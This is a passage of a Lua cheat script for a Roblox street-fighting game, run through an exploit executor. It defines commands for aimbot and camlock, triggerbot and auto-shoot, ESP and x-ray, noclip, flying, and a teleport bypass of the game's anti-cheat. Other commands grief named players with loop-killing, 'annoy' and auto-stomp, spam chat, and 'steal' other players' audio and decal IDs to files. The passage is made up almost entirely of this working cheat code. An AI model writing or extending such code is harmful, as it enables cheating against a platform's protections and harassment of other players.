AddCommand(function(Arguments)
	Spamming = not Spamming
	if Arguments[1] then 
		SpamMessage = table.concat(Arguments," ")
	end
end,"spam",{},"Spams the message that you set","[Message To Spam]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		SpamDelay = tonumber(Arguments[1]) or 1
	end 
end,"spamdelay",{},"Changes the spam delay amount","[Number]")

AddCommand(function(Arguments)
	local GameDescendants = game:GetDescendants()
	for i = 1,10 do 
		for i = 1,#GameDescendants do
			local Child = GameDescendants[i]
			if Child:IsA'Tool' and Child:FindFirstChild'Click' then 
				Child.Click:FireServer()
			end
		end
	end
end,"muteallradios",{"muteradios"},"Mutes all radios (Doesn't loop)","[No Args]")

AddCommand(function(Arguments)
	if not Arguments[1] then 
		TeleportService:TeleportToPlaceInstance(game.PlaceId,game.JobId)
	end
end,"rejoin",{"rj"},"Rejoins the current game server","[No Args]")

AddCommand(function(Arguments)
	if not Arguments[1] then 
		GetChar():BreakJoints()
	end 
end,"reset",{"re"},"Kills your Player","[No Args]")

AddCommand(function()
	AirwalkOn = not AirwalkOn
	AirWalk.Parent = AirwalkOn and workspace or not AirwalkOn and nil 
end,"airwalk",{},"Allows you to walk in the air","[No Args]")

AddCommand(function()
	NeverSitting = not NeverSitting
	if NeverSitting then 
		local workspaceChildren = workspace:GetDescendants()
		for i = 1,#workspaceChildren do 
			local Child = workspaceChildren[i]
			if string.find(Child.ClassName:lower(),"seat") then
				Child.Parent = CoreGui
			end
		end
	else
		local CoreGuiDescendants = CoreGui:GetDescendants() 
		for i = 1,#CoreGuiDescendants do 
			local Child = CoreGuiDescendants[i]
			if string.find(Child.ClassName:lower(),"seat") then 
				Child.Parent = workspace
			end
		end
	end
end,"neversit",{"nsit"},"Toggles the possibility of you being able to sit down","[No Args]")

AddCommand(function()
	AutoDie = not AutoDie
	notif("AntiKO","Has been set to "..tostring(AutoDie),5,nil)
end,"noko",{"antiko","autodie","autoreset"},"Auto resets when you get KO'ed","[No Args]")

AddCommand(function()
	Noclip = not Noclip
	notif("Noclip","Has been set to "..tostring(Noclip),5,nil)
end,"noclip",{},"Allows you to walk through walls and stuff","[No Args]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		local Player = PlrFinder(Arguments[1])
		if Player and Player.Character and Player.Character:FindFirstChild'Head' and Player ~= LP then 
			Teleport(Player.Character.Head.CFrame)
		end
	end
end,"goto",{"to"},"Teleports you to a player","[Player Name]")

AddCommand(function(Arguments)
	if Arguments[1] and tonumber(Arguments[1]) then 
		ClockTime = Arguments[1]
	else
		ClockTime = nil 
	end
end,"time",{},"Changes the time","[Number]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		local Player = PlrFinder(Arguments[1])
		if Player then 
			if Arguments[2] == "os" then 
				notif(Player.Name,"is on "..Player.OsPlatform,5,nil)
			elseif Arguments[2] == "age" then 
				notif(Player.Name,"has the account age of "..Player.AccountAge,5,nil)
			else
				notif(Player.Name,"is on "..Player.OsPlatform.." and has the account age of "..Player.AccountAge,5,nil)
			end
		end
	end
end,"playerinfo",{"info"},"[Player] [Os/Age(optional)]")

AddCommand(function(Arguments)
	AntiAim = not AntiAim
	if not AntiAim then
		stopAnim("215384594")
		stopAnim("188632011")
	else
		if Arguments[1] and Arguments[1] == "spin" then
			local Track = GetChar().Humanoid:LoadAnimation(SpinAnimation)
			while AntiAim and GetChar():FindFirstChild'Humanoid' and GetChar().Humanoid.Health > 0 and wait() do
				stopAnim("188632011")
				Track:play(0.1,1,10)
			end 
		else
			stopAnim("215384594")
			stopAnim("188632011")
			GetChar().Humanoid:LoadAnimation(AntiAimAnimation):Play(5,45,250)
		end 
	end 
end,"antiaim",{},"Breaks camlock to an extent","[Spin/No Args]")

AddCommand(function()
	local Punch = GetChar():FindFirstChild'Punch'
	if Punch then 
		if Punch.Grip == CFrame.new(math.huge,math.huge,math.huge) then
			Punch.Parent = LP.Backpack
			Punch.Grip = CFrame.new(0,0,0)
			wait()
			Punch.Parent = GetChar()
			notif("SuperPunch","Turned off",5,nil)
		else
			Punch.Parent = LP.Backpack
			Punch.Grip = CFrame.new(math.huge,math.huge,math.huge)
			wait()
			Punch.Parent = GetChar()
			notif("SuperPunch","Turned on (Lasts one life also really buggy)",5,nil)
		end
	else 
		notif("SuperPunch","Hold your fists",5,nil)
	end 
end,"superpunch",{},"This is really stupid and buggy but funny when it works","[No Args]")

AddCommand(function(Arguments)
	if Arguments[1] then
		if Arguments[1] == "1" then
			GunAnim = "1"
		elseif Arguments[1] == "2" then 
			GunAnim = "2"
		elseif Arguments[1] == "off" then 
			GunAnim = "None"
		else 
			notif("GunAnim","Only [1/2/Off] work")
			return
		end 
		notif("GunAnim","Has been set to "..GunAnim,5,nil)
	end 
end,"gunanim",{},"Stupid gun animations (gunanim [1/2/off])","[1/2/off]")

AddCommand(function(Arguments)
	if Arguments[1] then
		stopAnim("33796059")
		stopAnim("35654637")
		if Arguments[1] == "1" then 
			GetChar().Humanoid:LoadAnimation(Dance1Animation):Play()
		elseif Arguments[1] == "2" then 
			GetChar().Humanoid:LoadAnimation(Dance2Animation):Play()
		elseif Arguments[1] == "off" then 
			stopAnim("33796059")
			stopAnim("35654637")
		end 
	end
end,"dance",{},"Stupid dance anims (1,2,Off)","[Dance 1/Dance 2/Off]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		if Arguments[1] == "head" then 
			CamlockTarget = "Head"
		elseif Arguments[1] == "torso" then 
			CamlockTarget = "Torso"
		end
		notif("CamlockTarget","Has been set to "..CamlockTarget,5,nil)
	end
end,"camlocktarget",{"cltarget"},"Head,Torso to switch the camlock target","[Head/Torso]")

AddCommand(function()
	if game.PlaceId ~= 455366377 then notif("BringCar","Streets Only",5,nil) return end
	math.randomseed(os.time())
	if workspace:FindFirstChild'Cars' then
		local PartFound = GetChar():FindFirstChild'HumanoidRootPart' or GetChar():FindFirstChild'Torso'
		local ChildrenOfCars = workspace.Cars:GetDescendants()
		for i = 1,#ChildrenOfCars do 
			local i = math.random(1,#ChildrenOfCars)
			local Child = ChildrenOfCars[i]
			if Child:IsA'VehicleSeat' and Child.Name == "Drive" and not Child.Occupant then
				PartFound.CFrame = Child.CFrame
			end
		end
	else
		notif("No cars to bring","try again later",5,nil)
	end
end,"bringcar",{},"Brings a car (Normal TS only","[No Args]")

AddCommand(function()
	if game.PlaceId ~= 455366377 then notif("Heal","Streets Only",5,nil) return end
	if TpBypass then notif("Due to snakes bad code","you can not use burgers/drinks with the tpbypass") return end
		if GrabItem("burger",GetChar().Head.CFrame) then
		local Hamborger = LP.Backpack:FindFirstChild'Burger'
		if Hamborger then 
			Hamborger.Parent = GetChar()
			Hamborger:Activate() -- CHEEMS
			repeat RunService.Heartbeat:Wait() until Hamborger.Parent ~= LP.Character
		end
	end
	if GrabItem("drink",GetChar().Head.CFrame) then
		local Drink = LP.Backpack:FindFirstChild'Drink'
		if Drink then 
			Drink.Parent = GetChar()
			Drink:Activate()
		end 
	end
end,"heal",{"h"},"Heals you (Duh?)","[No Args]","[No Args]")

AddCommand(function(Arguments)
	if game.PlaceId ~= 455366377 then notif("Sorry,","Streets Only",5,nil) return end 
	HealBot = not HealBot 
	if Arguments[1] and Arguments[2] and tonumber(Arguments[2]) and Arguments[1] == "health" then 
		HealBotHealth = tonumber(Arguments[2])
	end 
	notif("HealBot","Has been set to "..tostring(HealBot),5,nil) 
end,"healbot",{},"Turns on auto healing at a set health (Defaults at 25 hp","[Health [Number] (Optional)]")

AddCommand(function()
	if game.PlaceId ~= 455366377 then notif("Heal","Streets Only",5,nil) return end
	if not GetChar():FindFirstChildOfClass'Tool' or not GetChar():FindFirstChildOfClass'Tool':FindFirstChild'Clips' then notif("Tool needed","Hold a gun",5,nil) return end 
	GrabItem("ammo",GetChar().Head.CFrame)
end,"reload",{"r"},"Gives your current gun ammo","[No Args]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		local Player = PlrFinder(Arguments[1])
		if Player and Player.Character and Player ~= LP then
			if ViewPlayerConnection then ViewPlayerConnection:Disconnect() ViewPlayerConnection = nil end 
			workspace.CurrentCamera.CameraSubject = Player.Character 
			if Arguments[2] and Arguments[2] == "loop" then 
				ViewPlayerConnection = Player.CharacterAdded:Connect(function(C)
					workspace.CurrentCamera.CameraSubject = C 
				end)
			end
		end
	end
end,"view",{},"Look through a different players perspective","[No Args]")

AddCommand(function()
	if ViewPlayerConnection then ViewPlayerConnection:Disconnect() ViewPlayerConnection = nil end 
	workspace.CurrentCamera.CameraSubject = GetChar()
end,"unview",{},"Look through your own vision like a normal person","[No Args]")

AddCommand(function()
	GunStomp = not GunStomp
	notif("GunStomp","Has been set to "..tostring(GunStomp),5,nil)
end,"gunstomp",{},"Toggles GunStomp (On by default)","[No Args]")

AddCommand(function(Arguments)
	CamLocking = not CamLocking 
	if Arguments[1] then 
		local Player = PlrFinder(Arguments[1])
		if Player then 
			CamlockPlayer = Player 
		end
	end
end,"camlock",{"lockcam","cl"},"Different type of aimbot (Uses camera instead of the remote)","[Player Name]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		if Arguments[1] == "auto" then 
			AutoFarm = not AutoFarm
			return 
		end
		if Arguments[1] == "sawed" then Arguments[1] = "sawed off" end
		farm(Arguments[1])
	end
end,"farm",{},"Farm (Cash,Sawed Off,Uzi,Shotty,Auto)","[Item/Auto]")

AddCommand(function()
	ItemEsp = not ItemEsp
	if ItemEsp then
		for i,_ in pairs(FarmTable) do
			local Part,String = find(i)
			if Part ~= "None" then 
				Esp(Part,String)
			end
		end
	else
		local Children = workspace:GetChildren()
		for i = 1,#Children do 
			Unesp(Children[i])
		end
	end
end,"itemesp",{},"Turns on ItemEsp","[No Args]")

AddCommand(function(Arguments)
if game.PlaceId ~= 455366377 then notif("Wont Work","Streets Only",5,nil) return end 
	if Arguments[1] then
		if Arguments[1] == "sawed" then Arguments[1] = "sawedoff" end
		if PartTable[Arguments[1]] then 
			GrabItem(Arguments[1],GetChar().Head.CFrame)
		end
	end
end,"get",{"tpto"},"(Burger,Drink,Ammo,Pipe,Machete,SawedOff,Spray,Uzi,Glock)","[Item]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		if PlaceTable[Arguments[1]] then 
			Teleport(PlaceTable[Arguments[1]])
		elseif Arguments[1] == "banland" then 
			TeleportService:Teleport(4669040)
		elseif Arguments[1] == "normalstreets" then 
			TeleportService:Teleport(455366377)
		end
	end
end,"place",{},"(SandBox,Jail,Gas,Court,Beach,Bank,BanLand,NormalStreets)","[Place]")

AddCommand(function(Arguments)
	Blinking = not Blinking
	if Blinking then
		if Arguments[1] and tonumber(Arguments[1]) then 
			BlinkSpeed = Arguments[1]
		else
			BlinkSpeed = 2
		end
	end
	notif("Blink","Has been set to "..tostring(Blinking),5,nil) 
end,"blink",{},"Different method of speed (Uses CFrame)","[Number (Optional)]")

AddCommand(function(Arguments)
	WalkShoot = not WalkShoot
	notif("WalkShoot","Has been set to "..tostring(WalkShoot),5,nil)
end,"walkshoot",{"noslow"},"Allows you to turn On/Off Walk Shooting","[No Args]")

AddCommand(function(Arguments)
	FeLoop = not FeLoop
	if Arguments[1] then
		FeLoop = true 
		local Player = PlrFinder(Arguments[1])
		if Player then 
			GetChar():BreakJoints()
			LoopPlayer = Player 
		end
	else
		LoopPlayer = nil
	end
end,"feloop",{},"First you were a skid, Now you're annoying with a simple use of this command!","[Player]")

AddCommand(function(Arguments)
	AnnoyOn = not AnnoyOn
	if Arguments[1] then 
		if AnnoyOn then
			local Player = PlrFinder(Arguments[1])
			if Player and Player ~= LP then 
				AnnoyingPlayer = Player
			end 
		end 
	end 
end,"annoy",{"shield"},"Loop Teleports you infront of the Player","[Player]")

AddCommand(function(Arguments)
	TriggerBot = not TriggerBot
	if not TriggerBot then
		wait()
		AnnoyOn = false 
		AnnoyingPlayer = nil
		AimbotAutoShoot = false
		Flying = false
		AutoDie = false
	end  
	if Arguments[1] and TriggerBot then
		AutoDie = true
		CheckCommand("annoy "..Arguments[1])
		AimbotAutoShoot = true
		if not NeverSitting then 
			CheckCommand("neversit")
		end
	end 
end,"triggerbot",{},"triggerbot goes brrrrrrrrrrrrrrrr","[Player]")

AddCommand(function()
	if game.PlaceId ~= 455366377 then notif("TriggerBotAutoReload","Only works on normal Streets",5,nil) return end
	TriggerBotAutoReload = not TriggerBotAutoReload
end,"triggerbotautoreload",{},"Triggerbot auto reload (instead of resetting only works on Ts) (also probably buggy)","[No Args]")

AddCommand(function(Arguments)
	if Arguments[1] and Arguments[2] and tonumber(Arguments[2]) then
		if Arguments[1] == "down" then 
			LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position = LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(),LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y + UDim.new(0,tonumber(Arguments[2])))
			LP.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(),LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y + UDim.new(0,3))
		elseif Arguments[1] == "up" then 
			LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position = LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position - UDim2.new(UDim.new(),LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y + UDim.new(0,tonumber(Arguments[2])))
			LP.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(),LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y + UDim.new(0,3))
		end
	end
end,"movechat",{},"Move Chat Up/Down with (Up/Down [Number])","[Up/Down] [Number]")

AddCommand(function(Arguments)
	if Arguments[1] and Arguments[1] == "legacy" then
		local Arm = GetChar():FindFirstChild'Right Arm'
		if Arm then
			Arm:Destroy()
		end
	else
		AntiKill = true 
		ToolTable = LP.Backpack:GetChildren()
		local Character = GetChar()
		Character.ChildAdded:Connect(function(Tool)
			if Tool:IsA'Tool' then
				if table.find(ToolTable,Tool) then return end
				Tool:Destroy()
			end
		end)
		notif("AntiKill","Turn on noclip for best results")
	end
end,"antikill",{},"Makes FE Loop not work (Legacy for removing right arm)","[Legacy (Optional)]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		local Player = PlrFinder(Arguments[1])
		if Player and Player.Character then
			local BoxModel = Player.Character:FindFirstChild'BoxModel' or Player.Character:FindFirstChild'BoomBox'
			if BoxModel and BoxModel:FindFirstChild'Handle' then
				if writefile then
					writefile("AudioLog from "..Player.Name.." "..math.random(1,99)..".txt",string.match(BoxModel.Handle:FindFirstChildOfClass'Sound'.SoundId,'%d+'))
					notif("Audio has been stolen.","Check your exploits workspace folder",5,nil)
				else
					print("Audio From: "..Player.Name.." Id: "..string.match(BoxModel.Handle:FindFirstChildOfClass'Sound'.SoundId,'%d+'))
					notif("Audio has been stolen.","It has been printed to your console (F9) due to your exploit not supporting writefile",5,nil)
				end
			end
		end
	end
end,"steal",{},"Steals a persons audio","[Player]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		local Player = PlrFinder(Arguments[1])
		if Player then 
			local Decal = workspace:FindFirstChild(Player.Name.."Spray")
			if Decal and Decal:FindFirstChildOfClass'Decal' then
				if writefile then  
					writefile("DecalLog from "..Player.Name.." "..math.random(1,99)..".txt",tostring(string.match(Decal.Decal.Texture,'%d+')))
				else
					print("Decal From: "..Player.Name.." Id: "..tostring(string.match(Decal.Decal.Texture,'%d+')))
				end 
			end
		end
	end
end,"decalsteal",{},"Steals a persons decal","[Player]")

AddCommand(function()
	if game.PlaceId ~= 455366377 then return notif("Wont work","Streets Only",5,nil) end
	if RainbowHats then RainbowHats = false LP.Backpack.Stank:FireServer("ren") end
	if RainbowFrame.Visible then RainbowFrame.Visible = false return end 
	RainbowScrolling:ClearAllChildren()
	RainbowFrame.Visible = true 
	local C = LP.PlayerGui.HUD.Clan.Group.Reps:GetChildren()
	createRainbow(UDim2.new(-0.002,0,0,-10),"All")
	for i = 1,#C do
		local Child = C[i]
		if Child:IsA'TextButton' and Child:FindFirstChild'typ' then 
			createRainbow(UDim2.new(-0.002,0,0,-40 + (i * 30)),Child.typ.Value,Child.typ)
		end
	end
end,"rainbowhats",{},"Opens a GUI so you can pick what hat to rainbowize","[No Args]")

AddCommand(function(Arguments)
	if game.PlaceId ~= 455366377 then return notif("Wont work","Streets Only",5,nil) end
	if Arguments[1] and tonumber(Arguments[1]) then
		Rainbowdelay = tonumber(Arguments[1])
	end
end,"rainbowhatdelay",{},"Changes the delay for rainbow hats","[Number]")

AddCommand(function(Arguments)
	if not Arguments[2] then 
		Flying = not Flying
	end 
	if Arguments[1] then 
		if Arguments[1] == "up" then 
			FlySpeed = FlySpeed + Arguments[2] or 1
			notif("FlySpeed","Has been set to "..FlySpeed,5,nil)
		elseif Arguments[1] == "down" then 
			FlySpeed = FlySpeed - Arguments[2] or 1
			notif("FlySpeed","Has been set to "..FlySpeed,5,nil)
		elseif tonumber(Arguments[1]) then
			FlySpeed = tonumber(Arguments[1])
			if Flying then
				Fly()
			end
		end
	else 
		if Flying then
			Fly()
		end 
	end
end,"fly",{},"Allows you to fly [Up/Down Speed]","[Up/Down Speed]/Speed")

AddCommand(function()
	DoubleJumpEnabled = not DoubleJumpEnabled
	notif("DoubleJumpEnabled","Has been set to "..tostring(DoubleJumpEnabled),5,nil)
end,"doublejump",{"infinitejump"},"Allows you to jump forever","[No Args]")

AddCommand(function()
	TpBypass = not TpBypass 
	GetChar():BreakJoints()
end,"tpbypass",{},"Teleportation Bypass (Allows Infinite FlySpeed etc)","[No Args]")

AddCommand(function(Arguments)
	if Arguments[1] then
		if WhiteListedParts[Arguments[1]] then 
			AimMode = WhiteListedParts[Arguments[1]]
			notif("AimTarget","has been set to "..AimMode,5,"rbxassetid://1281284684")
		end
	end
end,"aimtarget",{},"Changes the aim target [Head/Torso/HumanoidRootPart/Prediction]","[Head/Torso/HumanoidRootPart/Prediction]")

AddCommand(function(Arguments)
	if Arguments[1] then
		if Arguments[1] == "leftclick" then 
			AimlockMode = "LeftClick" 
		elseif Arguments[1] == "rightclick" then 
			AimlockMode = "RightClick" 
		elseif Arguments[1] == "nomouse" then 
			AimlockMode = "NoMouse"
		elseif Arguments[1] == "closest" then 
			AimlockMode = "Closest" 
			local PlayersT = Players:GetPlayers()
			for i = 1,#PlayersT do
				if PlayersT[i] ~= LP then 
					AimlockClosest(PlayersT[i])
				end 
			end
		end
		updateHotkeys(ConfigurationFile)
	end
end,"aimmode",{"aimlockmode"},"LeftClick/RightClick/NoMouse/Closest (Sets the way you can aimlock)","[LeftClick/RightClick/NoMouse/Closest]")

AddCommand(function(Arguments)
	if Arguments[1] and tonumber(Arguments[1]) then
		AimbotVelocity = tonumber(Arguments[1])
		if AimMode ~= "OldPrediction" and AimMode ~= "Prediction" then 
			notif("Note:","This only works with aimtarget oldprediction/prediction",5,nil)
		end
	end 
end,"aimvelocity",{},"Changes your Aimbots Velocity (If mode is set to a prediction mode) (Default: 5)","[Number]")

AddCommand(function(Arguments)
	if Arguments[1] and Arguments[1] ~= "all" then
		local Player = PlrFinder(Arguments[1])
		if Player and Player ~= LP and tostring(AimlockTarget) ~= tostring(Player) then 
			AimlockTarget,Aimlock = Player.Character,true
			local Connection;Connection = Player.CharacterAdded:Connect(function(C)
				if tostring(C) == tostring(AimlockTarget) then
					AimlockTarget = C
				else
					Connection:Disconnect()
					Connection = nil
				end
			end)
			notif("AimlockTarget","Has been set to "..AimlockTarget.Name,5,nil)
		end
	else
		Aimlock = not Aimlock
		notif("Aimlock","Has been set to "..tostring(Aimlock),5,nil)		
	end
end,"aimlock",{"aim"},"Aimbot (Different method than camlock)","[Player]")

--[[AddCommand(function()
	if game.PlaceId ~= 455366377 then notif("BFG","Streets only",5,nil) end
	BfgOn = not BfgOn
end,"bfg",{},"Shitty bfg I made (Normal Ts Only)","[No Args]")]]

AddCommand(function(Arguments)
	if Arguments[1] then
		if Arguments[1] == "triggerbot" then 
			AutoTriggerBot = not AutoTriggerBot
			notif("AutoTriggerBot","Has been set to "..tostring(AutoTriggerBot),5,nil)
		elseif Arguments[1] == "feloop" then 
			AutoFeloop = not AutoFeloop
			notif("AutoFeloop","Has been set to "..tostring(AutoFeloop),5,nil)
		end
	else 
		AutoTarget = not AutoTarget 
		notif("AutoTarget","Has been set to "..tostring(AutoTarget),5,nil)
	end 
end,"autotarget",{"autolock"},"autotarget [triggerbot/feloop/no arguments] triggerbot auto triggerbots when someone hits you,no args auto camlocks/aimlocks","[TriggerBot/FeLoop/No Args]")

AddCommand(function()
	AimbotAutoShoot = not AimbotAutoShoot
	notif("AimbotAutoShoot","Has been set to "..tostring(AimbotAutoShoot),5,nil)		
end,"aimbotautoshoot",{},"Auto shoots aimbot","[No Args]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		ClickTpKey = Arguments[1]:sub(1,1)
		updateHotkeys(ConfigurationFile)
	else
		ClickTpKey = nil
		updateHotkeys(ConfigurationFile)
	end
end,"clicktp",{"ctp"},"Allows you to teleport around the map with the Key you set","[Key]")

AddCommand(function()
	AutoStomp = not AutoStomp
end,"autostomp",{},"Turns On/Off AutoStomp","[No Args]")

AddCommand(function(Arguments)
	if Arguments[1] then 
			if Arguments[1] == "remove" and Arguments[2] then
				local Player = PlrFinder(Arguments[2])
				if Player and Player ~= LP then
					for i,v in pairs(StompWhitelist) do if Player.UserId == v then table.remove(StompWhitelist,i) end 	
				end 
			else
				local Player = PlrFinder(Arguments[1])
				if Player and Player ~= LP then 
					table.insert(StompWhitelist,Player.UserId)
				end
			end
		end
	end
end,"autostompwhitelist",{},"Adds the player to the whitelist so they don't get stomped, to remove use remove before their name","[Player]")

AddCommand(function(Arguments)
	if not Freecam then
		Freecam = true 
		FreeCam(Arguments[1])
	else
		Freecam = false
	end 
end,"freecam",{},"Allows you to \"free\" view the map","[Speed (Optional)]")

AddCommand(function()
	GravGunTool = Instance.new('Tool',LP.Backpack)
	GravGunTool.Name = "GravGun"
	GravGunTool.RequiresHandle = false 
	local Handle = Instance.new('Part',GravGunTool)
	Handle.Name = "Handle"
	Handle.Transparency = 1
end,"gravgun",{"gravitygun"},"Gmod Gravity gun","[Keys: Q,V] (No Args)")

AddCommand(function()
	ExploiterDetectionOn = not ExploiterDetectionOn
	notif("ExploiterDetection","Has been set to "..tostring(ExploiterDetectionOn),5,nil)
end,"exploiterdetection",{},"Detects exploiters (Has a chance to false flag)","[No Args]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		if Arguments[1] == "image" then 
			if Arguments[2] then 
				CmdBarImageLabel.Image = "http://www.roblox.com/asset/?id="..Arguments[2]
			end
		elseif Arguments[1] == "none" then 
			CmdBarImageLabel.Image = ""
		elseif Arguments[1] == "default" then
			CmdBarImageLabel.Image = "http://www.roblox.com/asset/?id=2812081613"
		end
		updateHotkeys(ConfigurationFile)
	end
end,"commandbarimage",{"cmdbarimage"},"Changes the command bar image","[Image/None/Default]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		local Player = PlrFinder(Arguments[1])
		if Player and Player ~= LP then 
			if typeof(Player) == "table" then
				for i = 1,#Player do
					local ActualPlr = Player[i]
					if ActualPlr ~= LP and ActualPlr.Character and ActualPlr.Character:FindFirstChild'Head' then
						if Arguments[1] == "users" and AdminUserTable[ActualPlr] or Arguments[1] ~= "users" then 
							EspTable2[ActualPlr] = true 
							Esp(ActualPlr.Character.Head,Player.Name)
							local EspEvent;EspEvent = ActualPlr.CharacterAdded:Connect(function(C)
								local Head = C:WaitForChild'Head'
								if EspTable[Player] then 
									Esp(Head,Player.Name)
								else 
									EspEvent:Disconnect()
								end
							end)
						end 
					end 
				end
			else
				if Player.Character and Player.Character:FindFirstChild'Head' then
					EspTable2[Player] = true 
					Esp(Player.Character.Head,Player.Name)
					local EspEvent;EspEvent = Player.CharacterAdded:Connect(function(C)
						local Head = C:WaitForChild'Head'
						if EspTable[Player] then 
							Esp(Head,Player.Name)
						else 
							EspEvent:Disconnect()
						end
					end)
				end 
			end 
		end 
	end
end,"esp",{},"Find a player anywhere in the map","[Player/All/Users]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		local Player = PlrFinder(Arguments[1])
		if Player then 
			if typeof(Player) == "table" then 
				for i = 1,#Player do
					local ActualPlr = Player[i]
					if ActualPlr.Character and ActualPlr.Character:FindFirstChild'Head' then 
						Unesp(ActualPlr)
					end 
				end
			else 
				if Player.Character and Player.Character:FindFirstChild'Head' then 
					Unesp(Player)
				end
			end
		end
	end
end,"unesp",{},"obviously removes the esp?","[Player/All]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		if Arguments[1] == "esp" then 
			EspColour = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
		elseif Arguments[1] == "bullet" then			
			BulletColour = ColorSequence.new(Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0))
		end
	end
end,"colour",{"color"},"Colour esp/bullet [3 Args (Number) (Optional)] defaults to 0","[Esp/Bullet] [3 numbers (Optional)]")

AddCommand(function()
	KeysFrame.Visible = not KeysFrame.Visible
end,"hotkey",{"key"},"For Setting hotkeys, Type in the textbox, click the button and press a key","[No Args]")

AddCommand(function(Arguments)
	if Arguments[1] then
		for Index,Key in pairs(Keys) do
		if Key:match'[%a%d]+$' == Arguments[1]:upper() or Key:match("[%a%d]+$") == Arguments[1] then
				table.remove(Keys,Index)
				updateHotkeys(ConfigurationFile)
			end
		end
	end
end,"removekey",{"rkey"},"Removes a hotkey to a command","[Key]")

AddCommand(function()
	Keys = {}
	ClickTpKey = ""
	updateHotkeys(ConfigurationFile)
end,"removeallhotkeys",{"removeallkeys"},"Removes all hotkeys","[No Args]")

AddCommand(function(Arguments)
	if readfile and writefile then 
		if Arguments[1] then 
			if Arguments[1] == "default" then 
				ConfigurationFile = "CyrusStreetsAdminSettings.json"
			elseif pcall(readfile,Arguments[1]..".json") then 
				ConfigurationFile = Arguments[1]..".json"
			else 
				ConfigurationFile = Arguments[1]..".json"
				initalizeHotkeys(ConfigurationFile)
			end
			runHotkeys(ConfigurationFile)
		end
	end
end,"config",{},"Changes Configs (Useful for having different profiles i.e legit etc)","[Config Name]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		if Arguments[1] == "wireframe" then
			Xray(Arguments[1],"wireframe")
		else 
			notif("Xray","Sorry, Only [Xray WireFrame/No Args] Work",5,nil)
		end
	else 
		Xray()
	end 
end,"xray",{},"see through walls (also has wireframe mode which looks cool but kills fps)","[WireFrame/No Args]")

-- [[ End ]] -- 

-- [[ Gui Initalization ]] -- 

coroutine.resume(coroutine.create(function()
	-- Rainbow Hats --
	RainbowFrame.Visible = false 
	RainbowFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
	RainbowFrame.BackgroundTransparency = 0.6
	RainbowFrame.Position = UDim2.new(0.3,0,0.17,0)
	RainbowFrame.Size = UDim2.new(0,460,0,359)
	RainbowFrame.AnchorPoint = Vector2.new(0,0)
	
	RainbowLabel.BackgroundColor3 = Color3.fromRGB(0,0,0)
	RainbowLabel.BackgroundTransparency = 0.3
	RainbowLabel.BorderColor3 = Color3.fromRGB(170,0,0)
	RainbowLabel.BorderSizePixel = 2
	RainbowLabel.Position = UDim2.new(-0.002,0,-0.14,0)
	RainbowLabel.Size = UDim2.new(0,460,0,50)
	RainbowLabel.Font = Enum.Font.SciFi
	RainbowLabel.Text = "Rainbow Hats"
	RainbowLabel.TextColor3 = Color3.fromRGB(255,170,255)
	RainbowLabel.TextSize = 50

	RainbowScrolling.BackgroundColor3 = Color3.fromRGB(0,0,0)
	RainbowScrolling.BackgroundTransparency = 0.3
	RainbowScrolling.BorderColor3 = Color3.fromRGB(170,0,0)
	RainbowScrolling.BorderSizePixel = 2
	RainbowScrolling.Position = UDim2.new(-0.0013,0,-0.0006,0)
	RainbowScrolling.Size = UDim2.new(0,460,0,359)
	RainbowScrolling.CanvasSize = UDim2.new(0,0,10,0)
	RainbowScrolling.ScrollBarThickness = 10
	
	CmdsFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
	CmdsFrame.BorderColor3 = Color3.fromRGB(170,0,0)
	CmdsFrame.BorderSizePixel = 0
	CmdsFrame.Position = UDim2.new(0.34,0,0.16,0)
	CmdsFrame.Size = UDim2.new(0,400,0,350)
	CmdsFrame.Style = Enum.FrameStyle.RobloxSquare
	CmdsFrame.Visible = false 
	CmdsFrame.AnchorPoint = Vector2.new(0,0)
	
	-- Help Gui --
	 
	CmdsLabel.BackgroundColor3 = Color3.fromRGB(116,0,0)
	CmdsLabel.BackgroundTransparency = 0.2
	CmdsLabel.BorderColor3 = Color3.fromRGB(49,0,0)
	CmdsLabel.BorderSizePixel = 0
	CmdsLabel.Position = UDim2.new(-0.02,0,-0.15,0)
	CmdsLabel.Size = UDim2.new(0,400,0,43)
	CmdsLabel.Font = Enum.Font.SciFi
	CmdsLabel.Text = "Commands"
	CmdsLabel.TextColor3 = Color3.fromRGB(255,255,255)
	CmdsLabel.TextSize = 20
	
	CmdsScrolling.Active = true
	CmdsScrolling.BackgroundColor3 = Color3.fromRGB(0,0,0)
	CmdsScrolling.BackgroundTransparency = 1
	CmdsScrolling.BorderColor3 = Color3.fromRGB(170,0,0)
	CmdsScrolling.BorderSizePixel = 0
	CmdsScrolling.Position = UDim2.new(-0.022,0,-0.02,0)
	CmdsScrolling.Size = UDim2.new(0,400,0,350)
	CmdsScrolling.CanvasSize = UDim2.new(0,0,10,0)
	CmdsScrolling.ScrollBarThickness = 10
	
	-- Command bar -- 
		
